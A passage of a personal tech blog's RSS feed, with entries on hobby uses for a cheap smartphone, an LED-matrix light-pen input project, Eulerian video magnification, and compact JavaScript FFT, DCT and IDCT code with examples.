&lt;p&gt;The specs are pretty respectable for something that costs less than a Chipotle burrito bowl. It has a dual-core 1.2GHz processor, 4.5” 800x400 capacitive touchscreen, a 5MP rear camera (no selfiecam, which is a tad unfortunate) with an LED flash, a microSD slot, 4GB of internal flash, 1GB of RAM, Android 4.4.2 KitKat, a 2100mAh battery, WiFi, and Bluetooth 4.0 LE + EDR. It’s carrier-locked to Verizon (it has no SIM card), so it’s better to think of it as an iPod Touch replacement, or as I do— a neat hunk of cheap hardware.&lt;/p&gt;
&lt;p&gt;So I bought something like a dozen of them. I ended up selling a couple to friends, so it wasn’t too ridiculously excessive, but I’ve still got a stack of four or so laying around collecting dust. But I’ve been struggling to find things to do with them. &lt;/p&gt;
&lt;h2 id=&quot;spotify-connect-alarm-clock&quot;&gt;Spotify Connect / Alarm Clock&lt;/h2&gt;
&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 200px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/Cheap%20Smartphone/spotify-medium.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;A first, relatively uncreative thought was to command-strip it to the wall next to my bed. This way I don’t have to fumble around looking for my phone to Google something at 2am. I can use the text-to-speech capabilities of Android to transcribe ideas that I have. &lt;/p&gt;
&lt;p&gt;I’ve hooked it up to some speakers that I’ve similarly mounted on the wall (I’m really quite a fan of command strips as a means of affixing objects to surfaces), so I can use the Spotify Connect to play music from my computer on my speakers (it’s slightly cooler than using Bluetooth because I can close my computer’s lid and the music continues playing). &lt;/p&gt;
&lt;h2 id=&quot;time-lapse-photography&quot;&gt;Time Lapse Photography&lt;/h2&gt;
&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 200px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/Cheap%20Smartphone/fisheye.JPG-medium.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;I’ve taken two of these phones and I’m using them for somewhat longer term time lapse recording projects. To a certain extent, it’s just because I have literally nothing better to do with it. &lt;/p&gt;
&lt;p&gt;I got a couple of those cheap $2 fisheye smartphone lens attachments from Amazon. I took one and hot glued it in place on the back of the phone, and stuck it facing my window. &lt;/p&gt;
&lt;p&gt;There’s another smartphone perched on a little bit of cardboard with a view of a little houseplant. &lt;/p&gt;
&lt;h2 id=&quot;teardown-ir-camera-microscopy&quot;&gt;Teardown / IR Camera / Microscopy&lt;/h2&gt;
&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 200px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/Cheap%20Smartphone/macro.JPG-medium.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;There’s an idea that I’ve been wanting to try for quite some time relating to infrared photography. I’ve been afraid to mess with most my cameras, because most of the cameras that I have aren’t particularly disposable. These phones, on the other hand, are entirely disposable. &lt;/p&gt;
&lt;p&gt;So I went and took apart the phone in hopes of removing the IR filter. Unfortunately, when trying to pry off the outer lens, I was a bit indelicate and ended up smashing the lens into little bits, to the extent that it was no longer possible to take pictures at all. &lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 200px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/Cheap%20Smartphone/blob-medium.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;That said, I was able to go into a dark closet and press the button on an IR remote and the sensor was not only able to detect see the light, but to register the increase in brightness of a scene invisibly lit by the tiny IR led. &lt;/p&gt;
&lt;p&gt;I’ve seen other people do microscopy with cheap smartphones by ripping out the lens and putting the sample directly on top of the CCD. Since I’ve already accidentally ripped out the lens, I figured why not try it out by putting a blob of saliva with a Q-tip on the sensor. &lt;/p&gt;
&lt;p&gt;I think if you run the numbers, the resolution is something in the ballpark of 5µm, so that blob is thousands of times larger than a cell. In fact it’s quite unlikely to be able to see or distinguish individual cell features with a phone camera of this resolution. &lt;/p&gt;
&lt;h2 id=&quot;connecting-to-arduino&quot;&gt;Connecting to Arduino&lt;/h2&gt;
&lt;p&gt;One of my main reasons for getting this cheap smartphone is that it’s just so much cheaper than an Arduino, and just so much more powerful in comparison. You get all these sensor capabilities— an accelerometer and gyroscope, touchscreen and high resolution display, bluetooth and WiFi. &lt;/p&gt;
&lt;p&gt;The problem is that smartphones don’t have GPIO pins, or even any serial ports. One thing the phone does have, however is an &lt;/p&gt;
</description>
    </item>
    <item>
      <title>Eulerian Video Magnification in the Browser</title>
      <link>http://antimatter15.com/2015/06/eulerian-video-magnification-in-the-browser/</link>
      <pubDate>Mon, 29 Jun 2015 23:23:54 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2015/06/eulerian-video-magnification-in-the-browser/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/EVM/evm.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;Welcome to the exciting June edition of &lt;em&gt;Tales From The Backlog&lt;/em&gt;. This particular entry is from two semesters ago, when I took &lt;a href=&quot;http://6.869.csail.mit.edu/fall14/&quot;&gt;6.819/6.869 Advances in Computer Vision&lt;/a&gt; taught by Professor &lt;a href=&quot;https://billf.mit.edu/&quot;&gt;Bill Freeman&lt;/a&gt; and &lt;a href=&quot;http://web.mit.edu/torralba/www/&quot;&gt;Antonio Torralba&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;For our final project, we had to reproduce some computer vision algorithm from a list. One of them was &lt;a href=&quot;http://people.csail.mit.edu/mrub/vidmag/&quot;&gt;Eulerian Video Magnification&lt;/a&gt;, that cool demo which has made its rounds on Hacker News on several occasions. &lt;/p&gt;
</description>
    </item>
    <item>
      <title>Handwriting Recognition with Microcontrollers</title>
      <link>http://antimatter15.com/2015/06/handwriting-recognition-with-microcontrollers/</link>
      <pubDate>Mon, 29 Jun 2015 23:23:54 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2015/06/handwriting-recognition-with-microcontrollers/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/6.115/IMG_0258.jpg&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;For my final project in &lt;a href=&quot;http://web.mit.edu/6.115/www/&quot;&gt;6.115&lt;/a&gt;, a microcomputer electronics class which I (and apparently nobody else) affectionately refer to as “leeblab”, I built a simple gestural input system. At its core lies an ordinary 8x8 LED matrix hacked into a low-res CCD and display coupled with a gutted expo dry erase marker used as a light pen. And per class requirements, it used a rube goldbergian cascade of TTL logic, an 8051, Cypress PSoC 5, an Arduino Pro Mini to process and massage the signals into USB HID compliant form, so that a computer might be able to use the contraption as a keyboard.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/6.115/IMG_0268.JPG&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;I had an 8x8 LED matrix laying around, and ‘twas the season that I had to come up with a final project for 6.115, a microcomputer electronics lab class. I vaguely recalled that an individual LED would generate a potential difference if you pummel it with enough photons. So I figured a cool and somewhat clever thing to do would be to create a display which could simultaneously act as a camera (pretty &lt;a href=&quot;https://en.wikipedia.org/wiki/Telescreen&quot;&gt;orweillian&lt;/a&gt; in retrospect). &lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 300px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/6.115/matrix-pinout-medium.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;I&amp;#39;m not totally sure about this, but I think this was the pinout of the LED matrix that I had. Notice that there doesn&amp;#39;t seem to be any sensible mapping between spatial position and the corresponding pins&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;The LED matrix was something like &lt;a href=&quot;https://www.adafruit.com/products/455&quot;&gt;this one&lt;/a&gt;. It’s wired using a technique called &lt;a href=&quot;https://en.wikipedia.org/wiki/Charlieplexing&quot;&gt;charlieplexing&lt;/a&gt;, where there’s a long wire along each row that connects the anodes of the LEDs, and another long weire along each column which connects the cathodes (modulo dyslexia). &lt;/p&gt;
&lt;p&gt;You can imagine taking a battery and a few clips and touching one point along the row wires and another point on the column wires and see a single pixel light up at the intersection of those columns and rows. &lt;/p&gt;
</description>
    </item>
    <item>
      <title>Cooley-Tukey FFT + DCT + IDCT in under 1K of Javascript</title>
      <link>http://antimatter15.com/2015/05/cooley-tukey-fft-dct-idct-in-under-1k-of-javascript/</link>
      <pubDate>Fri, 29 May 2015 23:23:54 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2015/05/cooley-tukey-fft-dct-idct-in-under-1k-of-javascript/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md right&quot; style=&quot;width: 300px&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2015/MiniFFT/hough-medium.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Technically this is a Hough transform and isn&amp;#39;t at all related to the FFT*, but it looks a lot cooler than any of the actual FFT/DCT pictures I have, so I might as well stick it here&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;Almost a year ago, I wrote a simple script for computing perceptual hashes in Javascript (it’s going to be part of a forthcoming Naptha feature which allows it recognize source images for memes and do perfect inpainting). One step of the process is computing the 2D Discrete Cosine Transform of a shrunken version of the image. &lt;/p&gt;
&lt;p&gt;The problem is that step was kind of ridiculously slow, and it’s not really hard to see why: there’s a series of four nested for loops— because that’s the obvious naive way for computing the DCT. &lt;/p&gt;
&lt;p&gt;In practice, it’s actually not all that bad because you only have to do it once per image, and the dimensions of the source image are a fixed 32x32. But it still felt pretty bad, so when I was looking over the code again earlier this week, I tried doing some research to figure out a faster way to do the DCT. &lt;/p&gt;
&lt;p&gt;Surely you’d imagine that there have to be extraordinarily efficient implements of the DCT out there, given that it’s the very foundation of JPEG out there. And you’d be right, but they’ve generally unrolled the butterfly into a series of bit-shifts which are quite unlikely to generalize beyond the 8x8 block size. &lt;/p&gt;
&lt;p&gt;I’m reasonably confident that FFTW3 has a fast DCT implementation which also is capable of generalization, but it seems buried within quite a lot of code. &lt;/p&gt;
&lt;h2 id=&quot;minifft&quot;&gt;MiniFFT&lt;/h2&gt;
&lt;p&gt;This isn’t a super performant implementation, but it’s not horrendously slow and it doesn’t use recursion. It’s probably pretty trivial to make it quite a bit faster by precomputing sine and cosine tables. This uses the standard Cooley-Tukey radix-2 decimation-in-time algorithm, which means it only works for one dimensional arrays with a length which is a power of two. &lt;/p&gt;
&lt;p&gt;It doesn’t check that the length is a power of two, it’ll just give you the wrong answer. You should definitely check that it’s true beforehand.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;miniFFT&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(re, im)&lt;/span&gt; &lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; N = re.length;
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;; i &amp;lt; N; i++) {
        &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; j = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, h = i, k = N; k &amp;gt;&amp;gt;= &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;; h &amp;gt;&amp;gt;= &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;)
            j = (j &amp;lt;&amp;lt; &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;) | (h &amp;amp; &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);
        &lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt; (j &amp;gt; i) {
            re[j] = [re[i], re[i] = re[j]][&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]
            im[j] = [im[i], im[i] = im[j]][&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]
        }
    }
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; hN = &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;; hN * &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; &amp;lt;= N; hN *= &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;)
        &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;; i &amp;lt; N; i += hN * &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;)
            &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; j = i; j &amp;lt; i + hN; j++) {
                &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; cos = &lt;span class=&quot;hljs-built_in&quot;&gt;Math&lt;/span&gt;.cos(&lt;span class=&quot;hljs-built_in&quot;&gt;Math&lt;/span&gt;.PI * (j - i) / hN),
                    sin = &lt;span class=&quot;hljs-built_in&quot;&gt;Math&lt;/span&gt;.sin(&lt;span class=&quot;hljs-built_in&quot;&gt;Math&lt;/span&gt;.PI * (j - i) / hN)
                &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; tre =  re[j+hN] * cos + im[j+hN] * sin,
                    tim = -re[j+hN] * sin + im[j+hN] * cos;
                re[j + hN] = re[j] - tre; im[j + hN] = im[j] - tim;
                re[j] += tre; im[j] += tim;
            }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The transformation happens in place, so it’ll modify whatever arrays you pass in. &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; re = [&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;],
    im = [&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;];
miniFFT(re, im);
&lt;span class=&quot;hljs-built_in&quot;&gt;console&lt;/span&gt;.log(re, im); &lt;span class=&quot;hljs-comment&quot;&gt;// [ 10, -2, -2, -2 ] [ 0, 2, 0, -2 ]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Minified, it’s only 359 bytes. Unlike this &lt;a href=&quot;https://gist.github.com/wrayal/995571&quot;&gt;other contender&lt;/a&gt; for the dubious prize of smallest javascript FFT implementation, it doesn’t require a special complex number library three times its size (though this doesn’t fit in a tweet— I’ll be really impressed if someone manages to do that). &lt;/p&gt;
&lt;p&gt;I haven’t really golfed the code to the smallest size possible, but I think it’s at a reasonable balance of brevity while still being somewhat comprehensible.&lt;/p&gt;
&lt;p&gt;It’s based on an in-place FFT from &lt;a href=&quot;http://introcs.cs.princeton.edu/java/97data/InplaceFFT.java.html&quot;&gt;Princeton’s intro CS&lt;/a&gt; class &lt;a href=&quot;http://www.nayuki.io/res/free-small-fft-in-multiple-languages/fft.js&quot;&gt;Project Nayuki’s FFT&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;miniifft&quot;&gt;MiniIFFT&lt;/h2&gt;
&lt;p&gt;Turns out that you can invert the FFT modulo a scaling factor just by swapping the real and imaginary arguments.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='matlab'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;miniIFFT&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(re, im)&lt;/span&gt;{&lt;/span&gt;
    miniFFT(im, re);
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(var &lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt; = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, N = re.&lt;span class=&quot;hljs-built_in&quot;&gt;length&lt;/span&gt;; &lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt; &amp;lt; N; &lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt;++)&lt;span class=&quot;hljs-cell&quot;&gt;{
        im[i] /= N;
        re[i] /= N;
    }&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;minidct&quot;&gt;MiniDCT&lt;/h2&gt;
&lt;p&gt;This is an implementation of a Type-II DCT using MiniFFT. For details about Makhoul’s algorithm for transforming a DCT into an FFT, see &lt;a href=&quot;http://dsp.stackexchange.com/a/10606&quot;&gt;this post&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='matlab'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;miniDCT&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(s)&lt;/span&gt;{&lt;/span&gt;
    var N = s.&lt;span class=&quot;hljs-built_in&quot;&gt;length&lt;/span&gt;,
        K = -Math.PI / (&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; * N),
        re = new Float64Array(N),
        im = new Float64Array(N);
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(var &lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt; = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;j&lt;/span&gt; = N; &lt;span class=&quot;hljs-built_in&quot;&gt;j&lt;/span&gt; &amp;gt; &lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt;; &lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt;++)&lt;span class=&quot;hljs-cell&quot;&gt;{
        re[i] = s[i * &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;]
        re[--j] = s[i * &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;]
    }&lt;/span&gt;
    miniFFT(re, im)
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(var &lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt; = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;; &lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt; &amp;lt; N; &lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt;++)
        s&lt;span class=&quot;hljs-matrix&quot;&gt;[i]&lt;/span&gt; = &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;*re&lt;span class=&quot;hljs-matrix&quot;&gt;[i]&lt;/span&gt;*Math.&lt;span class=&quot;hljs-built_in&quot;&gt;cos&lt;/span&gt;(K*&lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt;)-&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;*im&lt;span class=&quot;hljs-matrix&quot;&gt;[i]&lt;/span&gt;*Math.&lt;span class=&quot;hljs-built_in&quot;&gt;sin&lt;/span&gt;(K*&lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Like MiniFFT, it operates in-place (well, not really, but it writes its output to the source array).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; arr = [&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;4&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;hljs-number&quot;&gt;7&lt;/span&gt;];
miniDCT(arr);
&lt;span class=&quot;hljs-built_in&quot;&gt;console&lt;/span&gt;.log(arr); &lt;span class=&quot;hljs-comment&quot;&gt;// [ 30, -5.09493566, 7.0710678118, -8.604744653 ]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It produces the same output as scipy’s fftpack, but Matlab’s DCT uses orthogonal normalization and produces a different result. However, it’s pretty simple to do it the Matlab way— just scale everything by 1/sqrt(2 * N) and divide the first element by sqrt(2).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='matlab'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;matlabDCT&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(arr)&lt;/span&gt;{&lt;/span&gt;
    miniDCT(arr)
    arr&lt;span class=&quot;hljs-matrix&quot;&gt;[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;]&lt;/span&gt; /= Math.&lt;span class=&quot;hljs-built_in&quot;&gt;sqrt&lt;/span&gt;(&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;);   
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(var &lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt; = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, N = arr.&lt;span class=&quot;hljs-built_in&quot;&gt;length&lt;/span&gt;; &lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt; &amp;lt; N; &lt;span class=&quot;hljs-built_in&quot;&gt;i&lt;/span&gt;++) arr&lt;span class=&quot;hljs-matrix&quot;&gt;[i]&lt;/span&gt; /= Math.&lt;span class=&quot;hljs-built_in&quot;&gt;sqrt&lt;/span&gt;(&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; * N);
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;miniidct&quot;&gt;MiniIDCT&lt;/h2&gt;
&lt;p&gt;I really considered renaming this series of functions into TinyFFT and friends because of the predicament of MiniIDCT— yeah, exactly— the horror— repeating I’s. &lt;/p&gt;
&lt;p&gt;This is an implementation of a Type-III DCT, also known as the IDCT because it happens to be the inverse of a Type II DCT (frequently refered to as “&lt;em&gt;The&lt;/em&gt; DCT”).  &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;miniIDCT&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(s)&lt;/span&gt;&lt;/span&gt;{
    &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; N = s.length,
        K = &lt;span class=&quot;hljs-built_in&quot;&gt;Math&lt;/span&gt;.PI / (&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; * N),
        im = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Float64Array&lt;/span&gt;(N),
        re = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;hljs-built_in&quot;&gt;Float64Array&lt;/span&gt;(N);
    re[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;] = s[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;] / N / &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;;
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;; i &amp;lt; N; i++){
        &lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; im2 = &lt;span class=&quot;hljs-built_in&quot;&gt;Math&lt;/span&gt;.sin(i*K), re2 = &lt;span class=&quot;hljs-built_in&quot;&gt;Math&lt;/span&gt;.cos(i*K);
        re[i] = (s[N - i] * im2 + s[i] * re2) / N / &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;;
        im[i] = (im2 * s[i] - s[N - i] * re2) / N / &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;;
    }
    miniFFT(im, re)
    &lt;span class=&quot;hljs-keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;; i &amp;lt; N / &lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;; i++){
        s[&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; * i] = re[i]
        s[&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt; * i + &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;] = re[N - i - &lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;]
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is based on Tom Grydeland’s &lt;a href=&quot;http://www.idlcoyote.com/tip_examples/idct.pro&quot;&gt;IDL&lt;/a&gt; implementation of the IDCT. &lt;/p&gt;
&lt;p&gt;Let’s start with a 8 element array of real numbers (DCT values).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='json'&gt;&lt;/span&gt;[A, B, C, D, E, F, G, H]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From that it generates the corresponding complex values. Note that the real part is intact, and the complex part is the original array with its head chopped off and the rest of it flipped around and attached to a water balloon. &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='mathematica'&gt;&lt;/span&gt;[A, B, &lt;span class=&quot;hljs-keyword&quot;&gt;C&lt;/span&gt;, &lt;span class=&quot;hljs-keyword&quot;&gt;D&lt;/span&gt;, &lt;span class=&quot;hljs-keyword&quot;&gt;E&lt;/span&gt;, F, G, H] - j[&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;, H, G, F, &lt;span class=&quot;hljs-keyword&quot;&gt;E&lt;/span&gt;, &lt;span class=&quot;hljs-keyword&quot;&gt;D&lt;/span&gt;, &lt;span class=&quot;hljs-keyword&quot;&gt;C&lt;/span&gt;, B]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then the complex values are rotated by &lt;code&gt;exp(i * pi / (2 * N))&lt;/code&gt; to get spectral components. After an IFFT that gets transformed into:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='json'&gt;&lt;/span&gt;[a, h, c, f, e, d, g, b]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It took me a while to see what was going on there, but the even indices are map to the first half of the results, and the odd ones map to the second half in reverse&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='swift'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-type&quot;&gt;Scrambled&lt;/span&gt;      a h &lt;span class=&quot;hljs-built_in&quot;&gt;c&lt;/span&gt; f e d g b
&lt;span class=&quot;hljs-type&quot;&gt;Even&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;Indexed&lt;/span&gt;   a   &lt;span class=&quot;hljs-built_in&quot;&gt;c&lt;/span&gt;   e   g
&lt;span class=&quot;hljs-type&quot;&gt;Odd&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;Indexed&lt;/span&gt;      h   f   d   b
&lt;span class=&quot;hljs-type&quot;&gt;Odd&lt;/span&gt; &lt;span class=&quot;hljs-type&quot;&gt;Reversed&lt;/span&gt;     b   d   f   h
&lt;span class=&quot;hljs-type&quot;&gt;Unscrabmled&lt;/span&gt;    a b &lt;span class=&quot;hljs-built_in&quot;&gt;c&lt;/span&gt; d e f g h
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>Blog Reboot</title>
      <link>http://antimatter15.com/2015/04/blog-reboot/</link>
      <pubDate>Sat, 11 Apr 2015 19:09:52 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2015/04/blog-reboot/</guid>
      <author></author>
